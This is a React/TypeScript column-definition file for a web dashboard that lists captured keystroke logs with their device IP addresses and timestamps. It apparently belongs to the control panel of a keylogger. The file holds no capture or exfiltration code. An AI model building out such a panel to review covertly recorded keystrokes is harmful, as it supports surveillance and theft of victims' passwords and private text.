"use client";

import type { ColumnDef } from "@tanstack/react-table";
import {
  ArrowUpDown,
  ChevronDown,
  ChevronRight,
  Copy,
  MoreHorizontal,
  Trash2,
} from "lucide-react";
import { useState } from "react";

import { Button } from "@/components/ui/button";
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuLabel,
  DropdownMenuSeparator,
  DropdownMenuTrigger,
} from "@/components/ui/dropdown-menu";

export type LogEntry = {
  id: string;
  device: string;
  data: string;
  ip: string;
  timestamp: string;
};

function formatTimestamp(isoString: string): string {
  const date = new Date(isoString);
  return new Intl.DateTimeFormat("en-US", {
    year: "numeric",
    month: "short",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
    hour12: true,
  }).format(date);
}

const TRUNCATE_LENGTH = 100;

function ExpandableKeystrokeCell({ data }: { data: string }) {
  const [expanded, setExpanded] = useState(false);
  const needsTruncation = data.length > TRUNCATE_LENGTH;

  if (!needsTruncation) {
    return (
      <div className="font-mono text-xs">
        <span className="whitespace-pre-wrap break-all">{data}</span>
      </div>
    );
  }

  return (
    <div className="max-w-md font-mono text-xs">
      <button
        type="button"
        onClick={() => setExpanded(prev => !prev)}
        className="group/expand flex w-full cursor-pointer items-start gap-1.5 text-left"
      >
        <span className="mt-0.5 shrink-0 text-muted-foreground transition-colors group-hover/expand:text-foreground">
          {expanded ? (
            <ChevronDown className="h-3 w-3" />
          ) : (
            <ChevronRight className="h-3 w-3" />
          )}
        </span>
        <span className="whitespace-pre-wrap break-all">
          {expanded ? data : `${data.slice(0, TRUNCATE_LENGTH)}...`}
        </span>
      </button>
    </div>
  );
}

export const columns: ColumnDef<LogEntry>[] = [
  {
    accessorKey: "data",
    header: "Keystrokes",
    cell: ({ row }) => {
      const data = row.getValue("data") as string;
      return <ExpandableKeystrokeCell data={data} />;
    },
  },
  {
    accessorKey: "ip",
    header: ({ column }) => {
      return (
        <Button
          variant="ghost"
          onClick={() => column.toggleSorting(column.getIsSorted() === "asc")}
        >
          IP Address
          <ArrowUpDown className="ml-2 h-4 w-4" />
        </Button>
      );
    },
    cell: ({ row }) => {
      return (
        <span className="font-mono text-muted-foreground text-xs">
          {row.getValue("ip")}
        </span>
      );
    },
  },
  {
    accessorKey: "timestamp",
    header: ({ column }) => {
      return (
        <Button
          variant="ghost"
          onClick={() => column.toggleSorting(column.getIsSorted() === "asc")}
        >
          Timestamp
          <ArrowUpDown className="ml-2 h-4 w-4" />
        </Button>
      );
    },
    cell: ({ row }) => {
      const timestamp = row.getValue("timestamp") as string;
      return (
        <span className="whitespace-nowrap text-muted-foreground text-sm">
          {formatTimestamp(timestamp)}
        </span>
      );
    },
  },
  {
    id: "actions",
    cell: ({ row }) => {
      const log = row.original;

      return (
        <DropdownMenu>
          <DropdownMenuTrigger
            render={<Button variant="ghost" className="h-8 w-8 p-0" />}
          >
            <span className="sr-only">Open menu</span>
            <MoreHorizontal className="h-4 w-4" />
          </DropdownMenuTrigger>
          <DropdownMenuContent align="end">
            <DropdownMenuLabel>Actions</DropdownMenuLabel>
            <DropdownMenuItem
              onClick={() => navigator.clipboard.writeText(log.data)}
            >
              <Copy className="mr-2 h-4 w-4" />
              Copy keystrokes
            </DropdownMenuItem>
            <DropdownMenuItem
              onClick={() => navigator.clipboard.writeText(log.id)}
            >
              <Copy className="mr-2 h-4 w-4" />
              Copy log ID
            </DropdownMenuItem>
            <DropdownMenuSeparator />
            <DropdownMenuItem
              variant="destructive"
              onClick={async () => {
                try {
                  const res = await fetch(`/api/logs/${log.id}`, {
                    method: "DELETE",
                    headers: {
                      "x-api-key": localStorage.getItem("apiKey") ?? "",
                    },
                  });
                  if (res.ok) {
                    window.location.reload();
                  }
                } catch (error) {
                  console.error("Failed to delete log:", error);
                }
              }}
            >
              <Trash2 className="mr-2 h-4 w-4" />
              Delete log
            </DropdownMenuItem>
          </DropdownMenuContent>
        </DropdownMenu>
      );
    },
  },
];
